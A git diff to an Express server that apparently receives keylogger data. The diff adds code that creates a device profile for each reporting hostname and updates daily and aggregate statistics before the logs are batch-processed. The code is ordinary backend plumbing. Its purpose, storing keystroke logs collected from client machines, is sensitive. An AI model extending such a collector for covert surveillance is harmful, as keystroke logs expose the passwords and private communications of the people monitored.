@@ -3,10 +3,13 @@ import cors from 'cors'
 import { SERVER_CONFIG, configValues } from './config.js';
 import BatchProcessor from "./util/batchProcessor.js";
 import {processKeyloggerData} from "./util/cleanRawLogs.js";
+import {updateClientDailyWithLogs} from "./util/clientDailyUpdater.js";
 import connectDB from "./util/database.js";
 import userRoutes from './router/userRoutes.js';
 import driveRoutes from './router/driveRoutes.js';
 import clientRoutes from './router/clientRoutes.js';
+import ClientProfile from './models/ClientProfile.js';
+import { updateClientProfileAggregate } from './util/clientProfileUpdater.js';
 
 export const app = express();
 
@@ -36,10 +39,29 @@ app.post("/", async (req, res) => {
     if (!Array.isArray(logs) || !hostname) {
         return res.status(400).json({ success: false, message: "Missing logs array or hostname" });
     }
-    
+
     try {
+        // Ensure ClientProfile exists for this hostname (deviceName)
+        let clientProfile = await ClientProfile.findOne({ deviceName: hostname });
+        
+        if (!clientProfile) {
+            clientProfile = new ClientProfile({
+                deviceName: hostname,
+                registered_on: new Date()
+            });
+            await clientProfile.save();
+            console.log(`Created new ClientProfile for deviceName: ${hostname}`);
+        }
+
         // Preprocess logs before batch processing
         const processedLogs = processKeyloggerData(logs);
+        
+        // Update ClientDaily model with processed logs
+        await updateClientDailyWithLogs(hostname, processedLogs);
+
+        // Update ClientProfile aggregate stats
+        await updateClientProfileAggregate(hostname);
+        
         // Always use batch processing for consistency and reliability
         const result = await batchProcessor.processLargeDataset(hostname, processedLogs);
         
